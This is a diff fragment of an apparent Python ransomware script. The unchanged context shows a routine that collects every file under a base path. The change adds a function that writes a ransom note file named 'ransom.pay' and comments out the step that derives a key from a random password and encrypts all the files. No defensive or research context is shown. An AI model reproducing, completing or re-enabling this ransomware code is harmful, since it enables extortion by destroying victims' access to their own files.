@@ -59,11 +59,21 @@ def GetAllFiles(dirName):
                 allFiles.append(fullPath)
     return allFiles
 
+def WriteUserMessage():
+    file_name = "ransom.pay"
+    file_path = os.path.join(base_path, file_name)
+    ransom_message_file = open("ransom_message.txt", 'r')
+    ransom_message = ransom_message_file.read()
+    ransom_message_file.close()
+    with open(file_path, 'w') as ransomFile:
+        ransomFile.write(ransom_message)
+
 def StartEncryption():
-    files_to_encrypt = GetAllFiles(base_path)
-    password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))
-    key = SHA256.new(password.encode('utf-8')).digest()
-    EncryptAllFiles(files_to_encrypt, key)
+    #files_to_encrypt = GetAllFiles(base_path)
+    #password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))
+    #key = SHA256.new(password.encode('utf-8')).digest()
+    #EncryptAllFiles(files_to_encrypt, key)
+    WriteUserMessage()
 
 ###################### main ######################
 
